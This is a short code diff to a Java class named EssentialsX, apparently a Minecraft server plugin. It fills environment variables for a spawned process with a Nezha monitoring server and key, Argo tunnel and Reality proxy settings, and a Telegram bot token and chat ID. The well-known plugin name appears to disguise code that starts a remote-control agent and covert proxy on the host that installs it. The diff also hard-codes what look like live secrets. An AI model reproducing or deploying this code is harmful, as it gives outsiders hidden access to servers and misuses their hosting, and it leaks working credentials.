@@ -73,11 +73,11 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
+        env.put("UUID", "ea4909ef-7ca6-4b46-bf2e-6c07896ef407");
         env.put("FILE_PATH", "./world");
-        env.put("NEZHA_SERVER", "");
+        env.put("NEZHA_SERVER", "nazhav1.gamesover.eu.org:443");
         env.put("NEZHA_PORT", "");
-        env.put("NEZHA_KEY", "");
+        env.put("NEZHA_KEY", "qL7B61misbNGiLMBDxXJSBztCna5Vwsy");
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
@@ -88,11 +88,11 @@ public class EssentialsX extends JavaPlugin {
         env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
-        env.put("CHAT_ID", "");
-        env.put("BOT_TOKEN", "");
-        env.put("CFIP", "spring.io");
+        env.put("CHAT_ID", "558914831");
+        env.put("BOT_TOKEN", "5824972634:AAGJG-FBAgPljwpnlnD8Lk5Pm2r1QbSk1AI");
+        env.put("CFIP", "ip.sb");
         env.put("CFPORT", "443");
-        env.put("NAME", "");
+        env.put("NAME", "Host2play.gratis");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
